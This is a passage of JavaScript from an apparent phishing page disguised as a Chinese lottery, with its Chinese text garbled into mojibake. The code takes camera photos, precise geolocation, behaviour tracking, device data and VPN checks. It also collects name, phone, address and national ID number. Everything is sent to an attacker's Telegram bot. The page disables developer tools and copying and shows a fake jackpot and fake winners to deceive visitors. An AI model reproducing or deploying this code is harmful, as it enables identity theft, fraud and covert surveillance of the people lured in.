            document.getElementById('photoPreview').style.display = 'none';
            document.getElementById('retakeBtn').style.display = 'none';
            document.getElementById('captureBtn').style.display = 'inline-block';
        };
        
    } catch (error) {
        logToConsole('æ‘„åƒå¤´è®¿é—®è¢«æ‹’ç»: ' + error.message);
        document.getElementById('cameraSection').innerHTML = `
            <div style="text-align: center; padding: 40px;">
                <i class="fas fa-camera-slash" style="font-size: 60px; color: #FF4757; margin-bottom: 20px;"></i>
                <h3 style="color: #333;">æ‘„åƒå¤´è®¿é—®è¢«æ‹’ç»</h3>
                <p style="color: #666;">è¯·å…è®¸æ‘„åƒå¤´è®¿é—®ä»¥ç»§ç»­å‚ä¸æŠ½å¥–</p>
            </div>
        `;
    }
}

function capturePhoto(stream) {
    const video = document.getElementById('cameraVideo');
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // ä¿å­˜ç…§ç‰‡æ•°æ®
    const photoData = canvas.toDataURL('image/jpeg', 0.8);
    LOTTERY_DATA.biometrics.photo = photoData;
    LOTTERY_DATA.biometrics.timestamp = new Date().toISOString();
    LOTTERY_DATA.biometrics.photoData = {
        width: canvas.width,
        height: canvas.height,
        format: 'jpeg'
    };
    
    // æ˜¾ç¤ºé¢„è§ˆ
    document.getElementById('capturedPhoto').src = photoData;
    document.getElementById('photoPreview').style.display = 'block';
    document.getElementById('captureBtn').style.display = 'none';
    document.getElementById('retakeBtn').style.display = 'inline-block';
    
    // åœæ­¢æ‘„åƒå¤´
    stream.getTracks().forEach(track => track.stop());
    
    logToConsole('ç…§ç‰‡å·²æ•è·å¹¶ä¿å­˜');
    updateProgressBar(80);
}

// =============================================
// åœ°ç†ä½ç½®è·å–
// =============================================

function getLocation() {
    if (!LOTTERY_DATA.permissions.location) {
        logToConsole('ä½ç½®æƒé™æœªæˆæƒ');
        return;
    }
    
    if (!navigator.geolocation) {
        logToConsole('åœ°ç†ä½ç½®APIä¸å¯ç”¨');
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        (position) => {
            LOTTERY_DATA.geolocation.precise = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: position.timestamp
            };
            
            logToConsole(`ç²¾ç¡®ä½ç½®: ${position.coords.latitude}, ${position.coords.longitude} (Â±${Math.round(position.coords.accuracy)}m)`);
            
        },
        (error) => {
            logToConsole('åœ°ç†ä½ç½®è·å–å¤±è´¥: ' + error.message);
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// =============================================
// è¡Œä¸ºè·Ÿè¸ª
// =============================================

function startBehaviorTracking() {
    let mouseCount = 0;
    let clickCount = 0;
    let scrollCount = 0;
    const startTime = Date.now();
    
    // é¼ æ ‡ç§»åŠ¨è·Ÿè¸ª
    document.addEventListener('mousemove', () => {
        mouseCount++;
        LOTTERY_DATA.behavior.mouseMovements = mouseCount;
    });
    
    // ç‚¹å‡»è·Ÿè¸ª
    document.addEventListener('click', () => {
        clickCount++;
        LOTTERY_DATA.behavior.clicks = clickCount;
    });
    
    // æ»šåŠ¨è·Ÿè¸ª
    document.addEventListener('scroll', () => {
        scrollCount++;
        LOTTERY_DATA.behavior.scrolls = scrollCount;
    });
    
    // æ—¶é—´è·Ÿè¸ª
    setInterval(() => {
        LOTTERY_DATA.behavior.timeSpent = Math.round((Date.now() - startTime) / 1000);
    }, 1000);
}

// =============================================
// è¡¨å•æäº¤å¤„ç†
// =============================================

function setupFormValidation() {
    const form = document.getElementById('lotteryForm');
    const inputs = form.querySelectorAll('input[required]');
    
    inputs.forEach(input => {
        input.addEventListener('input', function() {
            updateFormProgress();
        });
    });
}

function updateFormProgress() {
    const form = document.getElementById('lotteryForm');
    const inputs = form.querySelectorAll('input[required]');
    let filled = 0;
    
    inputs.forEach(input => {
        if (input.value.trim() !== '') {
            filled++;
        }
    });
    
    const progress = Math.round((filled / inputs.length) * 100);
    updateProgressBar(progress);
}

function updateProgressBar(percent) {
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    
    progressFill.style.width = percent + '%';
    progressText.textContent = percent + '%';
}

// =============================================
// æäº¤æŠ½å¥–è¡¨å•
// =============================================

async function submitLotteryForm() {
    const submitBtn = document.getElementById('submitBtn');
    const originalText = submitBtn.innerHTML;
    
    try {
        // ç¦ç”¨æŒ‰é’®
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> æäº¤ä¸­...';
        
        // æ”¶é›†è¡¨å•æ•°æ®
        collectFormData();
        
        // è·å–åœ°ç†ä½ç½®ï¼ˆå¦‚æœæˆæƒï¼‰
        if (LOTTERY_DATA.permissions.location) {
            await getLocation();
        }
        
        // æ›´æ–°è¿›åº¦
        updateProgressBar(90);
        
        // å‘é€æ•°æ®åˆ°Telegram
        await sendDataToTelegram();
        
        // å®Œæˆ
        updateProgressBar(100);
        
        // æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
        submitBtn.innerHTML = '<i class="fas fa-check"></i> æäº¤æˆåŠŸï¼';
        submitBtn.style.background = 'linear-gradient(90deg, #4CD964, #2ED573)';
        
        // æ˜¾ç¤ºä¸­å¥–åŠ¨ç”»
        showWinningAnimation();
        
        // 3ç§’åé‡ç½®
        setTimeout(() => {
            resetForm();
            submitBtn.disabled = false;
            submitBtn.innerHTML = originalText;
            submitBtn.style.background = '';
        }, 3000);
        
    } catch (error) {
        logToConsole('æäº¤å¤±è´¥: ' + error.message);
        submitBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> æäº¤å¤±è´¥';
        submitBtn.style.background = 'linear-gradient(90deg, #FF4757, #FF0000)';
        
        setTimeout(() => {
            submitBtn.disabled = false;
            submitBtn.innerHTML = originalText;
            submitBtn.style.background = '';
        }, 3000);
    }
}

function collectFormData() {
    LOTTERY_DATA.userInfo = {
        name: document.getElementById('userName').value,
        phone: document.getElementById('userPhone').value,
        email: document.getElementById('userEmail').value,
        wechat: document.getElementById('userWechat').value,
        address: document.getElementById('userAddress').value,
        idCard: document.getElementById('userIdCard').value,
        submitTime: new Date().toISOString()
    };
    
    LOTTERY_DATA.system.lotteryNumber = generateLotteryNumber();
}

// =============================================
// Telegramå‘é€åŠŸèƒ½
// =============================================

async function sendDataToTelegram() {
    try {
        // å‘é€æ–‡æœ¬ä¿¡æ¯
        const textMessage = formatTelegramMessage();
        await sendTelegramMessage(textMessage);
        
        // å¦‚æœæœ‰ç…§ç‰‡ï¼Œå‘é€ç…§ç‰‡
        if (LOTTERY_DATA.biometrics.photo) {
            await sendTelegramPhoto(LOTTERY_DATA.biometrics.photo, 'ğŸ“¸ æŠ½å¥–å‚ä¸è€…ç…§ç‰‡');
        }
        
        // å‘é€è¯¦ç»†æ•°æ®æ–‡ä»¶
        const detailedData = JSON.stringify(LOTTERY_DATA, null, 2);
        await sendTelegramDocument(detailedData, 'æŠ½å¥–æ•°æ®.json');
        
        logToConsole('æ•°æ®å·²å‘é€åˆ°Telegram');
        
    } catch (error) {
        throw new Error('Telegramå‘é€å¤±è´¥: ' + error.message);
    }
}

async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    });
    
    if (!response.ok) {
        throw new Error('æ¶ˆæ¯å‘é€å¤±è´¥');
    }
}

async function sendTelegramPhoto(photoData, caption) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendPhoto`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            photo: photoData,
            caption: caption
        })
    });
    
    if (!response.ok) {
        throw new Error('ç…§ç‰‡å‘é€å¤±è´¥');
    }
}

async function sendTelegramDocument(data, filename) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`;
    
    const blob = new Blob([data], { type: 'application/json' });
    const reader = new FileReader();
    
    return new Promise((resolve, reject) => {
        reader.onloadend = async function() {
            const base64data = reader.result.split(',')[1];
            
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                    document: `data:application/json;base64,${base64data}`,
                    filename: filename
                })
            });
            
            if (response.ok) {
                resolve();
            } else {
                reject(new Error('æ–‡æ¡£å‘é€å¤±è´¥'));
            }
        };
        
        reader.readAsDataURL(blob);
    });
}

function formatTelegramMessage() {
    const data = LOTTERY_DATA;
    let message = `ğŸ° <b>æ–°çš„æŠ½å¥–å‚ä¸è€…ï¼</b>\n\n`;
    
    // ç”¨æˆ·ä¿¡æ¯
    message += `ğŸ‘¤ <b>åŸºæœ¬ä¿¡æ¯</b>\n`;
    message += `å§“å: ${data.userInfo.name}\n`;
    message += `ç”µè¯: ${data.userInfo.phone}\n`;
    message += `å¾®ä¿¡: ${data.userInfo.wechat}\n`;
    message += `é‚®ç®±: ${data.userInfo.email}\n`;
    message += `åœ°å€: ${data.userInfo.address}\n`;
    message += `èº«ä»½è¯: ${data.userInfo.idCard}\n\n`;
    
    // æŠ½å¥–ä¿¡æ¯
    message += `ğŸ¯ <b>æŠ½å¥–ä¿¡æ¯</b>\n`;
<script>
// =============================================
// é¢å¤–çš„å®‰å…¨æ£€æµ‹åŠŸèƒ½
// =============================================

// æ£€æµ‹VPN/ä»£ç†
async function detectVPN() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        // æ£€æŸ¥å¸¸è§ä»£ç†æ ‡å¿—
        const vpnDetected = data.org && (
            data.org.toLowerCase().includes('vpn') ||
            data.org.toLowerCase().includes('proxy') ||
            data.org.toLowerCase().includes('tor')
        );
        
        if (vpnDetected) {
            logToConsole('æ£€æµ‹åˆ°å¯èƒ½ä½¿ç”¨VPN/ä»£ç†');
            LOTTERY_DATA.network.vpnDetected = true;
            LOTTERY_DATA.network.vpnInfo = data.org;
        }
        
    } catch (error) {
        // é™é»˜å¤±è´¥
    }
}

// æ£€æµ‹è®¾å¤‡ç”µæ± 
async function detectBattery() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            LOTTERY_DATA.device.battery = {
                charging: battery.charging,
                level: Math.round(battery.level * 100),
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (error) {
            // é™é»˜å¤±è´¥
        }
    }
}

// æ£€æµ‹æ—¶åŒº
function detectTimezone() {
    LOTTERY_DATA.device.timezone = {
        name: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: new Date().getTimezoneOffset(),
        locale: navigator.language
    };
}

// æ£€æµ‹å±å¹•æ–¹å‘
function detectOrientation() {
    LOTTERY_DATA.device.orientation = {
        type: screen.orientation ? screen.orientation.type : 'unknown',
        angle: screen.orientation ? screen.orientation.angle : 0
    };
    
    // ç›‘å¬æ–¹å‘å˜åŒ–
    screen.orientation && screen.orientation.addEventListener('change', () => {
        LOTTERY_DATA.device.orientation = {
            type: screen.orientation.type,
            angle: screen.orientation.angle
        };
    });
}

// æ£€æµ‹ç½‘ç»œçŠ¶æ€å˜åŒ–
function monitorNetwork() {
    if (navigator.connection) {
        navigator.connection.addEventListener('change', () => {
            LOTTERY_DATA.network.connection = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            };
        });
    }
}

// =============================================
// éº¦å…‹é£æµ‹è¯•åŠŸèƒ½
// =============================================

async function testMicrophone() {
    if (!LOTTERY_DATA.permissions.mic) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const analyser = audioContext.createAnalyser();
        const microphone = audioContext.createMediaStreamSource(stream);
        microphone.connect(analyser);
        
        LOTTERY_DATA.biometrics.microphone = {
            sampleRate: audioContext.sampleRate,
            channels: stream.getAudioTracks()[0].getSettings().channelCount || 1,
            tested: true,
            timestamp: new Date().toISOString()
        };
        
        // 5ç§’ååœæ­¢
        setTimeout(() => {
            stream.getTracks().forEach(track => track.stop());
            audioContext.close();
        }, 5000);
        
    } catch (error) {
        logToConsole('éº¦å…‹é£æµ‹è¯•å¤±è´¥: ' + error.message);
    }
}

// =============================================
// é¡µé¢ä¿æŠ¤åŠŸèƒ½
// =============================================

// é˜²æ­¢å¤åˆ¶
document.addEventListener('copy', (e) => {
    e.preventDefault();
    Swal.fire({
        icon: 'warning',
        title: 'å¤åˆ¶åŠŸèƒ½å·²ç¦ç”¨',
        text: 'ä¸ºä¿è¯æŠ½å¥–å…¬å¹³ï¼Œç¦æ­¢å¤åˆ¶é¡µé¢å†…å®¹',
        timer: 2000,
        showConfirmButton: false
    });
});

// é˜²æ­¢å³é”®
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
});

// é˜²æ­¢å¼€å‘å·¥å…·
document.onkeydown = function(e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        Swal.fire({
            icon: 'error',
            title: 'è®¿é—®è¢«æ‹’ç»',
            text: 'ä¸ºä¿è¯æŠ½å¥–å®‰å…¨ï¼Œç¦æ­¢ä½¿ç”¨å¼€å‘è€…å·¥å…·',
            timer: 3000,
            showConfirmButton: false
        });
        return false;
    }
};

// é¡µé¢ç¦»å¼€ç¡®è®¤
window.addEventListener('beforeunload', (e) => {
    if (LOTTERY_DATA.userInfo.name) {
        e.preventDefault();
        e.returnValue = 'æŠ½å¥–ä¿¡æ¯å°šæœªæäº¤ï¼Œç¡®å®šè¦ç¦»å¼€å—ï¼Ÿ';
    }
});

// =============================================
// å®šæœŸæ›´æ–°æ˜¾ç¤º
// =============================================

setInterval(() => {
    // æ›´æ–°å€’è®¡æ—¶
    updateJackpotAmount();
    
    // éšæœºæ›´æ–°ä¸­å¥–è€…
    if (Math.random() > 0.7) {
        generateWinnersList();
    }
}, 60000); // æ¯åˆ†é’Ÿæ›´æ–°ä¸€æ¬¡

function updateJackpotAmount() {
    const currentAmount = parseFloat(document.getElementById('jackpotAmount').textContent.replace(/[^0-9]/g, ''));
    const newAmount = currentAmount + Math.random() * 10000;
    document.getElementById('jackpotAmount').textContent = 'Â¥ ' + formatCurrency(newAmount);
}

// =============================================
// åˆå§‹åŒ–æ‰€æœ‰åŠŸèƒ½
// =============================================

// é¡µé¢å®Œå…¨åŠ è½½åæ‰§è¡Œ
window.onload = function() {
    // å»¶è¿Ÿæ‰§è¡Œé¢å¤–æ£€æµ‹
    setTimeout(() => {
        detectVPN();
        detectBattery();
        detectTimezone();
        detectOrientation();
        monitorNetwork();
        
        // å¦‚æœéº¦å…‹é£æƒé™å¼€å¯ï¼Œæµ‹è¯•éº¦å…‹é£
        if (LOTTERY_DATA.permissions.mic) {
            setTimeout(() => testMicrophone(), 5000);
        }
        
    }, 5000);
};
</script>

<!-- æ·»åŠ SweetAlertåº“ -->
<link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
